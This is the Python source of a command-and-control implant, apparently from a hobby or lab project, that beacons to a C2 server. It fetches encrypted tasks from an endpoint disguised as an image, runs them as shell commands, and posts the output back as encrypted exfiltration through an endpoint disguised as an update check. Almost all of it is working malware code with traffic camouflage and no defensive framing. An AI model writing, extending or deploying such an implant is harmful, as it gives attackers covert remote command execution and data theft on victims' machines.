# implant.py
# Standalone Python implant that beacons to C2, executes tasks, and posts exfiltration.
# Uses Curve25519 handshake, AES-GCM encryption, and JSON envelope defined in common/protocol.py.

import requests
import base64
import time
import subprocess
import json
import logging
import sys
import os
from common.crypto_lib import generate_keypair, derive_key, aes_gcm_encrypt, aes_gcm_decrypt
from common.protocol import encode_message, decode_message

#config logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

#general config
C2_HOST = 'http://localhost:8000'
HANDSHAKE_URL = f"{C2_HOST}/handshake"
TASK_URL = f"{C2_HOST}/images/logo.png"
EXFIL_URL = f"{C2_HOST}/updates/check"
BEACON_INTERVAL = 10  # seconds between polls
MAX_RETRIES = 5

#Persistent state
session_id = None
shared_key = None
seq_counter = 0

# 1) Handshake to establish session and derive shared key
def perform_handshake():
    global session_id, shared_key, seq_counter
    retries = 0
    while retries < MAX_RETRIES:
        try:
            # Generate client keypair
            client_priv, client_pub = generate_keypair()
            payload = {'pubkey': base64.b64encode(client_pub).decode('ascii')}
            resp = requests.post(HANDSHAKE_URL, json=payload, timeout=5)
            resp.raise_for_status()
            data = resp.json()

            session_id = data['sid']
            server_pub = base64.b64decode(data['pubkey'])
            shared_key = derive_key(client_priv, server_pub)
            seq_counter = 0
            logging.info(f"Handshake complete. Session: {session_id}")
            return
        except Exception as e:
            retries += 1
            logging.error(f"Handshake failed (attempt {retries}/{MAX_RETRIES}): {e}")
            time.sleep(2**retries) #take more time the further into retries that we are (decrease while debugging or else this gets tedious-TRUST ME)
    logging.critical("Handshake failed after maximum retries, exiting.")
    sys.exit(1)

# helper to execute shell command and return dict of results
def execute_task(task_str):
    try:
        result = subprocess.run(
            task_str,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired as te:
        return {'error': 'timeout', 'details': str(te)}
    except Exception as e:
        return {'error': 'execution_failed', 'details': str(e)}


#helper to fetch/decrypt tasks
def fetch_task():
    global seq_counter
    try:
        headers = {'X-Session-ID': session_id}
        params = {'id': session_id}
        resp = requests.get(TASK_URL, headers=headers, params=params, timeout=5)
        if resp.status_code != 200:
            return None
        ciphertext = resp.content
        plaintext = aes_gcm_decrypt(shared_key, ciphertext)
        envelope = decode_message(plaintext)
        expected = seq_counter + 1
        if envelope['seq'] != expected:
            raise ValueError(f"Task sequence mismatch: got {envelope['seq']}, expected {expected}")
        seq_counter = envelope['seq']
        return envelope['body']
    except Exception as e:
        logging.error(f"Error fetching task: {e}")
        return None

# Helper to encrypt/send exfiltrated output
def send_exfiltration(data):
    global seq_counter
    try:
        # Wrap in envelope
        next_seq = seq_counter + 1
        envelope = encode_message(sid=session_id, seq=next_seq, cmd='exfil', body=data)
        ciphertext = aes_gcm_encrypt(shared_key, envelope)
        headers = {'X-Session-ID': session_id, 'Content-Type': 'application/octet-stream'}
        resp = requests.post(EXFIL_URL, headers=headers, data=ciphertext, timeout=5)
        if resp.status_code == 204:
            seq_counter = next_seq
            logging.info(f"Exfiltration sent. seq={seq_counter}")
        else:
            logging.error(f"Failed to send exfiltration: HTTP {resp.status_code}")
    except Exception as e:
        logging.error(f"Error sending exfiltration: {e}")

# Main loop: beacon, process task, exfiltrate results
def main():
    perform_handshake()
    while True:
        task = fetch_task()
        if task:
            logging.info(f"Received task: {task}")
            # Execute and capture output
            result = execute_task(task)
            payload = json.dumps(result)
            send_exfiltration(payload)
        time.sleep(BEACON_INTERVAL)

if __name__ == '__main__':
    main()
